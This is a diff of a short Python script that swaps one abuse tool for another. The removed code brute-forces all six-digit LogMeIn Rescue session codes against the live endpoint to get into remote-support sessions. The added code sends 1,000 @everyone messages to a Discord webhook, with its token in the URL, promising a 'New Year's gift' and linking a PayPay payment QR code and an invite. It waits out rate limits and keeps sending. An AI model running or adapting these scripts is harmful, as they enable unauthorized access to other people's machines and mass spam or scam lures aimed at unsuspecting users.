@@ -1,35 +1,34 @@
 import requests
 import time
 
-url = "https://secure.logmeinrescue.com/Customer/Code.aspx"
-session = requests.Session()
+url = "https://discord.com/api/webhooks/1464948642224935150/Odj3Z0-U-iD7Q9mMysWmvSR-khyw1qTwpyEGXl-gjg8HbCx-ZWxHi6AYRcc_JZYxF-ru"
 
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Referer": "https://secure.logmeinrescue.com/Customer/Code.aspx"
+payload = {
+    "content": (
+        "unchi buri\n"
+        "@everyone\n"
+        "# Happy new year !!\n"
+        "# I will give you a New Year's gift!!!!\n"
+        "# https://qr.paypay.ne.jp/p2p01_3NMG3zbxHeBk17WL\n"
+        "# discord.gg/aa-bot"
+    )
 }
 
-for i in range(1000000):
-    code = f"{i:06}"
+print("送信")
 
-    payload = {
-        "Code": code,
-        "IsEmbeddedInFrame": "false",
-        "maxTouchPoints": "0"
-    }
-
-    try:
-        response = session.post(url, data=payload, headers=headers)
-        
-        if "Success" in response.text: 
-            print(f"[*] 成功したコードを見つけました: {code}")
-            break
-        
-        print(f"Testing: {code} - Status: {response.status_code}")
-
-        time.sleep(0.1)
-
-    except Exception as e:
-        print(f"エラー: {e}")
+for i in range(1000):
+    response = requests.post(url, json=payload)
+    
+    if response.status_code == 204:
+        print(f"{i+1}回：うんち成功")
+    elif response.status_code == 429:
+        wait_time = response.json().get('retry_after', 1)
+        print(f"ぶりぶりせいげん。 {wait_time}秒待機します...")
+        time.sleep(wait_time)
+    else:
+        print(f"うんちぶり: {response.status_code}")
         break
-    import os 
+
+    time.sleep(0.5)
+
+print("完了しました。")
